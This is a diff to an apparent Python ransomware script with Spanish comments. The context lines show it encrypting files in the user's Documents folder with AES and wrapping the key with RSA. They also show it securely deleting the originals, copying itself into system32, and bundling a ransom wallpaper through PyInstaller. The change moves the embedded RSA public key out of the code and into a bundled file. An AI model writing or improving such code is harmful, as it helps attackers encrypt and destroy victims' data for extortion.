@@ -27,6 +27,23 @@ def cifrar_clave_aes_rsa(clave_aes, public_key_pem):
     )
     return base64.b64encode(clave_cifrada).decode()
 
+# Función para leer la clave pública desde un archivo
+def leer_clave_publica():
+    # Si estamos en PyInstaller, usar la carpeta _MEIPASS para acceder al archivo
+    if getattr(sys, 'frozen', False):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+
+    # Ruta completa del archivo 'public_key.pem'
+    ruta_clave_publica = os.path.join(base_path, 'public_key.pem')
+
+    # Leer el contenido del archivo
+    with open(ruta_clave_publica, 'r') as f:
+        public_key_pem = f.read()
+
+    return public_key_pem
+
 # Función para cifrar archivos con AES
 def cifrar_archivo_aes(archivo, clave_aes):
     cipher = AES.new(clave_aes, AES.MODE_CBC)
@@ -48,6 +65,8 @@ def borrar_archivo_seguro(archivo):
 
     # Eliminar el archivo después de sobrescribirlo
     os.remove(archivo)
+
+
 
 
 # Función para copiar el ejecutable a la carpeta system32
@@ -78,6 +97,8 @@ def obtener_ruta_imagen_empaquetada():
         return os.path.join(sys._MEIPASS, 'fondo.jpeg')  # Nombre de la imagen
     else:
         return 'fondo.jpeg'  # Ruta alternativa si no está empaquetada
+
+
  
 
 # Obtener el directorio "Documents" del usuario
@@ -94,15 +115,8 @@ extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
 clave_aes = generar_clave_aes()
 
 # Llave pública proporcionada (en formato PKCS#8).
-public_key_pem = '''-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAk9c8fM3oEyNAWNylkTei
-Xe0U1GTDqgUCrjOCkoweLpnZr9JihFS888GbJiy+V7WqmFGO20tjsnRLFtgKveVa
-Lao0GQP2+cHRzDoXRqkb0Ukn1S/YM6u+BQY+5vwWceQxW10pi8nlasOz6Ua9TJaI
-vlEElXoh5AZUDrstUbuOPwaKsbMyj8iLnkcjGglMjSm5U6Scllaods3x/6SIuCSe
-Ijb8ZPqMzz5rhzkxQvmzl/PTXdchBHKClbQhurqB9oDc97dP46z6QoV+vfBH6ac5
-+2eN9SUCa8rtxvifnfaltX8Z8Kj723fTI6ZLZhShjVl/BdV+PHdkeCC/3p58taX0
-iQIDAQAB
------END PUBLIC KEY-----'''
+# Leer la clave pública desde el archivo
+public_key_pem = leer_clave_publica()
 
 # Cifrar la clave AES con RSA
 clave_aes_cifrada = cifrar_clave_aes_rsa(clave_aes, public_key_pem)
